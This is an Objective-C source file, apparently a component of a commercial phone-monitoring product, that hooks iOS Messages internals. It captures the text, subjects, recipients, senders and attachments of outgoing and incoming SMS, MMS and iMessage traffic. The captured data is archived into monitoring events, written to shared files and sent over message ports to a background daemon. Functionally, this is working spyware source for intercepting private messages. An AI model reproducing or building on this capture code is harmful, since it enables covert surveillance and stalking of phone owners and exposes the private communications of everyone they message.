
/**
 - Project name :  MSFSP
 - Class name   :  SMSUtils
 - Version      :  1.0  
 - Purpose      :  For MS
 - Copy right   :  31/1/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
 */


#import "SMSUtils.h"
#import "BlockEvent.h"
#import "DefStd.h"
#import "MessagePortIPCSender.h"
#import "DaemonPrivateHome.h"
#import "DateTimeFormat.h"

#import "CKConversation.h"
#import "_CKConversation.h"
#import "CKSubConversation.h"
#import "CKSubConversation.h"
#import "CKSMSMessage.h"
#import "CKSMSMessage+IOS5.h"
#import "CKTextMessagePart.h"

#import "CKMediaObjectMessagePart.h"
#import "CKMediaObject.h"
#import "CKCompressibleImageMediaObject.h"
#import "CKAVMediaObject.h"
#import "CKImageData.h"
#import "IMMessage.h"

#import "CKMadridEntity.h"
#import "CKMadridMessage.h"
#import "IMHandle.h"
#import "IMAccount.h"

#import "FxIMEvent.h"
#import "FxRecipient.h"

@interface SMSUtils (private)
+ (BOOL) deliverEventData: (NSData *) aEventData portName: (NSString *) aPortName;
+ (NSString *) messagePath: (unsigned int) aMessageID;
+ (BOOL) isValidEmail: (NSString *) checkString;
@end

@implementation SMSUtils

/**
 - Method name: createEvent:recipient:blockEventType:direction
 - Purpose: This method is used to create outgoing SMS, MMS and Imessage event when restriction is enable
 - Argument list and description: aMessage (id), aRecipient (id), aEventType (NSInteger), aDirection (NSInteger)
 - Return description: Not return type
 */
+ (void) createEvent: (id) aMessage
		   recipient: (id) aRecipient
	  blockEventType: (NSInteger) aBlockEventType
		   direction: (NSInteger) aDirection {
	DLog (@"Create event in case of block aMessage = %@, aRecipient = %@, aBlockEvent = %d", aMessage, aRecipient, aBlockEventType);
	switch (aBlockEventType) {
		case kSMSEvent: {
			CKSMSMessage *ckSMSMessage = aMessage;
			NSArray *recipients = aRecipient;
			NSString *smsSubject = [ckSMSMessage subject];
			NSString *message = [ckSMSMessage text];
			
			// Note: if user specified subject, the text will be null (tested IOS 4.2.1 Iphone 4)
			if (!message) { 
				NSArray *parts = [SMSUtils messageParts:ckSMSMessage];
				NSMutableString *textPart = [NSMutableString string];
				for (id messagePart in parts) {
					Class $CKTextMessagePart = objc_getClass("CKTextMessagePart");
					if ([messagePart isKindOfClass:$CKTextMessagePart]) {
						[textPart appendString:[messagePart text]];
					}
				}
				message = [NSString stringWithString:textPart];
			}
			DLog (@"recipients = %@, message = %@, subject = %@, messages = %@", recipients, message, smsSubject, [ckSMSMessage messages]);
			
			NSMutableData* data = [[NSMutableData alloc] init];
			NSKeyedArchiver *archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
			NSMutableDictionary *dictionary = [[NSMutableDictionary alloc] init];
			[dictionary setValue:smsSubject forKey:kMessageSubjectKey]; // Protocol not contain subject
			[dictionary setValue:message forKey:kSMSTextKey];
			[dictionary setValue:recipients forKey:kMessageSenderKey];
			[dictionary setValue:kSMSOutgoing forKey:kSMSTypeKey];
			[dictionary setValue:kMessageTypeSMS forKey:kMessageTypeKey];
			[archiver encodeObject:dictionary forKey:kMessageMonitorKey];
			[archiver finishEncoding];
			
			NSString *filePath = [self messagePath:[ckSMSMessage rowID]];
			[data writeToFile:filePath atomically:YES];
			BOOL success = [SMSUtils deliverEventData:[filePath dataUsingEncoding:NSUTF8StringEncoding] portName:kSMSMessagePort];
			if (!success) {
				NSFileManager *fileManager = [NSFileManager defaultManager];
				[fileManager removeItemAtPath:filePath error:nil];
			}
			
			[dictionary release];
			[archiver release];
			[data release];
		} break;
		case kMMSEvent: {
			CKSMSMessage *ckSMSMessage = aMessage;
			NSArray *recipients = aRecipient;
			NSMutableArray *mmsAttachments = [[NSMutableArray alloc] init];
			NSString *mmsSubject = [ckSMSMessage subject];
			NSString *mmsMessage = @"";
			
			// Basically is to create array of dictionary info
			NSArray *parts = [SMSUtils messageParts:ckSMSMessage];
			DLog (@"All message parts = %@", parts);
			for (id messagePart in parts) {
				DLog (@"Message part of aMessage is = %@", messagePart);
				
//				Jul 17 15:32:28 1Ph0n34 MobileSMS[6361]: part = <CKTextMessagePart: 0x17c880>
//				Jul 17 15:32:28 1Ph0n34 MobileSMS[6361]: text = Fuss
//				Jul 17 15:32:28 1Ph0n34 MobileSMS[6361]: contentLocation = text_0001.txt (can be null)
//				Jul 17 15:32:28 1Ph0n34 MobileSMS[6361]: part = <CKMediaObjectMessagePart: 0x163350>
//				Jul 17 15:32:28 1Ph0n34 MobileSMS[6361]: CKMediaObject = <CKCompressibleImageMediaObject: 0x1eab10>
//				Jul 17 15:32:28 1Ph0n34 MobileSMS[6361]: filename = /var/mobile/Library/SMS/Parts/2f/10/874-1.jpg
//				Jul 17 15:32:28 1Ph0n34 MobileSMS[6361]: data = (null)
//				Jul 17 15:32:28 1Ph0n34 MobileSMS[6361]: mimeType = image/jpeg
//				Jul 17 15:32:28 1Ph0n34 MobileSMS[6361]: exportedFilename = IMG_3616.jpg
//				Jul 17 15:32:28 1Ph0n34 MobileSMS[6361]: duration = 0.000000
				
				if ([messagePart isKindOfClass:NSClassFromString(@"CKTextMessagePart")]) {
					// Check subject first
					if (![mmsSubject length]) {
						mmsSubject = [NSString stringWithString:[messagePart text]];
					}
					// Manipulate the message body
					mmsMessage = [mmsMessage stringByAppendingFormat:@"%@\n\n", [messagePart text]];
					
					NSInteger index = [[messagePart text] length] > 10 ? 10 : [[messagePart text] length];
					NSString *partialFileName = [[messagePart text] substringToIndex:index];
					
					NSMutableDictionary *dictItem = [[NSMutableDictionary alloc] init];
					
					NSData *attachment = [[messagePart text] dataUsingEncoding:NSUTF8StringEncoding];
					NSString *fileName = [NSString stringWithFormat:@"%u_%@.txt", [ckSMSMessage rowID], partialFileName];
					
					//DLog (@"File name of text object = %@, content location = %@", fileName, [messagePart contentLocation]);
					
					[dictItem setValue:fileName forKey:kMMSFileNameKey];					
					[dictItem setValue:attachment forKey:kMMSAttachmenInfoKey];
					
					[mmsAttachments addObject:dictItem];
					[dictItem release];
					
				} else if ([messagePart isKindOfClass:NSClassFromString(@"CKMediaObjectMessagePart")]) {
					CKMediaObject *mediaObject = [messagePart mediaObject];
					//DLog (@"Class of media object = %@", [mediaObject class]);
					
					NSMutableDictionary *dictItem = [[NSMutableDictionary alloc] init];
					
					NSData *attachmentData = nil;
					
					if ([mediaObject isKindOfClass:NSClassFromString(@"CKCompressibleImageMediaObject")]) {
						CKImageData *ckImageData = [(CKCompressibleImageMediaObject *)mediaObject imageData];
						//DLog (@"1. CKImageData = %@", ckImageData);
						ckImageData = [ckImageData jpegDataWithMaxLength:100*1024 compression:0.1];
						//DLog (@"2. CKImageData = %@", ckImageData);
						attachmentData = [ckImageData data];
					} else {
						attachmentData = [mediaObject data] ? [mediaObject data] : [mediaObject dataForMedia];
					}

					
//					DLog(@"CKMediaObject = %@", [messagePart mediaObject]);
//					DLog(@"filename = %@", [[messagePart mediaObject] filename]);
//					DLog(@"data = %@", [[messagePart mediaObject] data]);
//					DLog(@"mimeType = %@", [[messagePart mediaObject] mimeType]);
//					DLog(@"exportedFilename = %@", [[messagePart mediaObject] exportedFilename]);
//					DLog(@"duration = %f", [[messagePart mediaObject] duration]);
					
//					DLog (@"Data length of media object is = %d, data = %@", [[mediaObject data] length], [mediaObject data]);
//					DLog (@"========================================");
//					DLog (@"========================================");
//					DLog (@"attachmentData length %d, data = %@", [attachmentData length], attachmentData);
					
					if ([mediaObject exportedFilename]) {
						NSString *fileName = [NSString stringWithFormat:@"%u_%@", [ckSMSMessage rowID], [mediaObject exportedFilename]];
						
						//DLog (@"File name of media object = %@, file name = %@", fileName, [mediaObject exportedFilename]);
						
						// Too big equal to original size of media
						//[mediaObject dataRepresentation]
						//[mediaObject dataForMedia]
						
						//[messagePart composeData] // bubble image data
						//[messagePart previewData] // bubble image data
						//[messagePart highlightData] // bubble highlight image data
						
						[dictItem setValue:fileName forKey:kMMSFileNameKey];
						[dictItem setValue:attachmentData forKey:kMMSAttachmenInfoKey];
					} else {
						[dictItem setValue:attachmentData forKey:kMMSAttachmenInfoKey];
					}
					
					[mmsAttachments addObject:dictItem];
					[dictItem release];
				}
			}
			
			DLog (@"=====================================");
			DLog (@"MMS attachments = %@", mmsAttachments);
			DLog (@"MMS subject = %@", mmsSubject);
			DLog (@"MMS message = %@", mmsMessage);
			DLog (@"MMS recipients = %@", recipients);
			DLog (@"=====================================");
			
			if ([parts count] == 0 && [mmsMessage length] == 0) { // MMS send to email address
				mmsMessage = [ckSMSMessage text];
				if (![mmsSubject length]) {
					mmsSubject = [NSString stringWithString:mmsMessage];
				}
					
				DLog (@"=====================================");
				DLog (@"MMS message = %@, subject = %@", mmsMessage, mmsSubject);
				DLog (@"=====================================");
				
				NSInteger index = [mmsMessage length] > 10 ? 10 : [mmsMessage length];
				NSString *partialFileName = [mmsMessage substringToIndex:index];
				
				NSMutableDictionary *dictItem = [[NSMutableDictionary alloc] init];
				
				NSData *attachment = [mmsMessage dataUsingEncoding:NSUTF8StringEncoding];
				NSString *fileName = [NSString stringWithFormat:@"%u_%@.txt", [ckSMSMessage rowID], partialFileName];
				
				DLog (@"File name of text object = %@", fileName);
				
				[dictItem setValue:fileName forKey:kMMSFileNameKey];					
				[dictItem setValue:attachment forKey:kMMSAttachmenInfoKey];
				
				[mmsAttachments addObject:dictItem];
				[dictItem release];
			}
			
			// Default attachment if there is no one
			if (![mmsAttachments count]) {
				NSData *attachment = [mmsSubject dataUsingEncoding:NSUTF8StringEncoding];
				NSString *defaultFileName = [NSString stringWithFormat:@"default_mmsatt_%lf.txt",[[NSDate date] timeIntervalSince1970]];
				NSMutableDictionary *dictItem = [[NSMutableDictionary alloc] init]; 
				[dictItem setValue:attachment forKey:kMMSAttachmenInfoKey];
				[dictItem setValue:defaultFileName forKey:kMMSFileNameKey];
				[mmsAttachments addObject:dictItem];
				[dictItem release];
			}
			
			NSMutableData* data = [[NSMutableData alloc] init];
			NSKeyedArchiver *archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
			NSMutableDictionary *dictionary = [[NSMutableDictionary alloc] init];
			[dictionary setObject:mmsAttachments forKey:kMMSAttachments];
			[dictionary setValue:mmsSubject forKey:kMessageSubjectKey];
			[dictionary setValue:recipients forKey:kMMSRecipients];
			[dictionary setValue:kMMSOutgoing forKey:kMMSTypeKey]; // For incoming is captured in capturing mobile substrate
			[dictionary setValue:kMessageTypeMMS forKey:kMessageTypeKey];
			[dictionary setValue:mmsMessage forKey:kMMSTextKey];
			[archiver encodeObject:dictionary forKey:kMessageMonitorKey];
			[archiver finishEncoding];
			
			NSString *filePath = [SMSUtils messagePath:[ckSMSMessage rowID]];
			[data writeToFile:filePath atomically:YES];
			BOOL success = [SMSUtils deliverEventData:[filePath dataUsingEncoding:NSUTF8StringEncoding] portName:kMMSMessagePort];
			if (!success) {
				NSFileManager *fileManager = [NSFileManager defaultManager];
				[fileManager removeItemAtPath:filePath error:nil];
			}
			
			[dictionary release];
			[archiver release];
			[data release];
			[mmsAttachments release];
		} break;
		case kIMEvent: {
			NSArray *parts = [SMSUtils messageParts:aMessage];
			//DLog(@"Madrid message parts = %@", parts);
			CKMadridMessage *ckMadridMessage = aMessage;
			// We support only no attachment of IM
			if (![ckMadridMessage hasAttachments] && ![[ckMadridMessage imMessage] hasInlineAttachments] &&
				[SMSUtils isSMS:parts]) { // Check sms here mean whether message have attachment [DOUBLE CHECK]
				NSMutableArray *participants = [NSMutableArray array];
				NSMutableArray *uniqueIMHandleID = [NSMutableArray array];		// This array keep the ID that is used to create FxRecipinet
				
				if (aDirection == kBlockEventDirectionOut) {
					for (CKMadridEntity *entity in [[ckMadridMessage conversation] recipients]) {
						for (IMHandle *imHandle in [entity imHandles]) {
							if (![uniqueIMHandleID containsObject:[imHandle ID]]) {		// ensure that we will not create FxRecipient with the same id (e.g., phone number, apple id)
								//DLog(@"name = %@, displayID = %@, account.displayName = %@", [imHandle name], [imHandle displayID], [[imHandle account] displayName])
								FxRecipient *participant = [[FxRecipient alloc] init];
								[participant setRecipNumAddr:[imHandle displayID]];
								[participant setRecipContactName:[imHandle name]];
								[participants addObject:participant];
								[uniqueIMHandleID addObject:[imHandle ID]];
								[participant release];
							} 
						}
					}
				} else if (aDirection == kBlockEventDirectionIn) {
					//DLog (@"aRecipient = %@", aRecipient);
					
					// NOTE: for incoming target is recipient
					
					IMHandle *targetIMHandle = [aRecipient objectAtIndex:0]; // Has at least one element
					FxRecipient *participant = [[FxRecipient alloc] init];
					//[participant setRecipNumAddr:[[targetIMHandle account] uniqueID]];
					//[participant setRecipContactName:[[targetIMHandle account] displayName]];
					[participant setRecipNumAddr:[[targetIMHandle account] displayName]];
					[participant setRecipContactName:@""];
					[participants addObject:participant];
					[participant release];
					
					CKMadridEntity *senderEntity = [ckMadridMessage sender];
					IMHandle *senderIMHandle = [[senderEntity imHandles] objectAtIndex:0]; // Alway has one element
					//DLog (@"senderIMHandle = %@", senderIMHandle)
					
					for (IMHandle *recipientIMHandle in aRecipient) {
						//DLog(@">> recipientIMHandle = %@, name = %@, displayID = %@, account.displayName = %@", recipientIMHandle,
						//	 [recipientIMHandle name], [recipientIMHandle displayID], [[recipientIMHandle account] displayName])
						
						if (![[recipientIMHandle name] isEqualToString:[senderIMHandle name]] ||
							![[recipientIMHandle displayID] isEqualToString:[senderIMHandle displayID]]) {
							FxRecipient *participant = [[FxRecipient alloc] init];
							[participant setRecipNumAddr:[recipientIMHandle displayID]];
							[participant setRecipContactName:[recipientIMHandle name]];
							[participants addObject:participant];
							[participant release];
						}
					}
				}
				
				NSString *message = [NSString string];
				for (id messagePart in [ckMadridMessage parts]) {
					if ([messagePart isKindOfClass:NSClassFromString(@"CKTextMessagePart")]) {
						message = [message stringByAppendingFormat:@"%@\n", [messagePart text]];
					}
				}
				DLog (@"Content of IMMessage = %@, participants = %@", message, participants);
				
				// --- IMAccount finding
				IMAccount *imAccount = nil;
				if (aDirection == kBlockEventDirectionOut) {
					// CKMadridMessage -> CKConversation -> CKMadridEntity -> IMHandle -> IAccount
					// IMAccount is nil when create new conversation (drawback)
					imAccount = [[[[[ckMadridMessage conversation] recipients] objectAtIndex:0] defaultIMHandle] account]; // Always have IMHandle at least 1
				} else if (aDirection == kBlockEventDirectionIn) {
					IMHandle *imHandle = [aRecipient objectAtIndex:0]; // Always have IMHandle at least 1
					imAccount = [imHandle account];
				}
				
				//DLog (@"IMAccount of this IMessage = %@, displayName = %@, uniqueID = %@", imAccount, [imAccount displayName], [imAccount uniqueID]);
				
				NSMutableData* data = [[NSMutableData alloc] init];
				FxIMEvent *imEvent = [[FxIMEvent alloc] init];
				//[imEvent setMUserID:[imAccount uniqueID]];
				[imEvent setMIMServiceID:kIMServiceIDiMessage];
				if (aDirection == kBlockEventDirectionOut) {
					[imEvent setMDirection:kEventDirectionOut];
					IMAccount *senderIMAccount = [[[[[ckMadridMessage conversation] recipients] objectAtIndex:0] defaultIMHandle] account];
					[imEvent setMUserID:[senderIMAccount displayName]];
					[imEvent setMUserDisplayName:@""];							  
				} else if (aDirection == kBlockEventDirectionIn) {
					[imEvent setMDirection:kEventDirectionIn];
					CKMadridEntity *senderEntity = [ckMadridMessage sender]; // Outgoing sender is null ****
					IMHandle *senderIMHandle = [[senderEntity imHandles] objectAtIndex:0]; // Always has at least one 														
					[imEvent setMUserID:[senderIMHandle displayID]];
					[imEvent setMUserDisplayName:[senderIMHandle name]];
				}
				[imEvent setMMessage:message];
				//[imEvent setMUserDisplayName:[imAccount displayName]];
				[imEvent setMParticipants:participants];			
				[imEvent setMAttachments:[NSArray array]];
				[imEvent setDateTime:[DateTimeFormat phoenixDateTime]];
				NSKeyedArchiver *archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
				[archiver encodeObject:imEvent forKey:kiMessageArchived];
				[archiver finishEncoding];
				if (![SMSUtils deliverEventData:data portName:kiMessageMessagePort1]) {
					[SMSUtils deliverEventData:data portName:kiMessageMessagePort2];
				}
				[archiver release];
				[imEvent release];
				[data release];				
			} else {
				DLog (@"CKMadirdMessage has attachments thus NOT capture");
			}
		} break;
		default:
			break;
	}
}

/**
 - Method name: messageParts
 - Purpose: This method is used to get message parts from CKSMSMessage
 - Argument list and description: aMessage (CKSMSMessage *)
 - Return type and description: Array of message part
 */

+ (NSArray *) messageParts: (CKSMSMessage *) aMessage {
	NSArray *parts = nil;
	if ([aMessage respondsToSelector:@selector(messageParts)]) { // IOS 4.2.1
		parts = [aMessage messageParts];
	} else if ([aMessage respondsToSelector:@selector(parts)]) { // IOS 5
		parts = [aMessage parts];
	}
	return (parts);
}

+ (BOOL) isSMS: (NSArray *) aMessageParts {
	BOOL isSMS = YES;
	for (id part in aMessageParts) {
		if (![part isKindOfClass:NSClassFromString(@"CKTextMessagePart")]) {
			isSMS = NO;
			break;
		}
	}
	return (isSMS);
}

+ (BOOL) isParticipantsHasEmailAddress: (NSArray *) aParticipants {
	BOOL isEmail = NO;
	for (NSString *email in aParticipants) {
		
		if ([SMSUtils isValidEmail:email]) {
			isEmail = YES;
			break;
		}
		
	}
	return (isEmail);
}

+ (BOOL) isIOS5 {
	return ([[[UIDevice currentDevice] systemVersion] intValue] == 5);
}

+ (BOOL) isIOS4 {
	return ([[[UIDevice currentDevice] systemVersion] intValue] == 4);
}

/**
 - Method name: deliverEventData:portName
 - Purpose: This method is used to create deliver event to daemon application
 - Argument list and description: No Argument
 - Return type and description: No Return 
 */

+ (BOOL) deliverEventData: (NSData *) aEventData portName: (NSString *) aPortName {
	MessagePortIPCSender *messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:aPortName];
	BOOL success = [messagePortSender writeDataToPort:aEventData];
	[messagePortSender release];
	DLog (@"Write event data to message port = %@, success = %d", aPortName, success);
	return (success);
}

/**
 - Method name: messagePath:
 - Purpose: This method is used to get mms/sms unique file path to save its content before send to daemon application
 - Argument list and description: aMessageID (unsigned int) mms/sms message id
 - Return type and description: Unique file path for that message id
 */

+ (NSString *) messagePath: (unsigned int) aMessageID {
	return [NSString stringWithFormat:@"%@smsmms_%u.dat", [DaemonPrivateHome daemonSharedHome], aMessageID];
}

+ (BOOL) isValidEmail: (NSString *) checkString {
	BOOL stricterFilter = YES;
	NSString *stricterFilterString	= @"[A-Z0-9a-z._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,4}"; 				
	NSString *laxString				= @".+@.+\\.[A-Za-z]{2}[A-Za-z]*";
	NSString *emailRegex			= stricterFilter ? stricterFilterString : laxString;
	NSPredicate *emailTest			= [NSPredicate predicateWithFormat:@"SELF MATCHES %@", emailRegex];
	return [emailTest evaluateWithObject:checkString];
}

/**
 - Method name: dealloc
 - Purpose:  This method is used to manage memory
 - Argument list and description: No Argument
 - Return type and description: No Return 
 */

- (void) dealloc {
	[super dealloc];	
}

@end
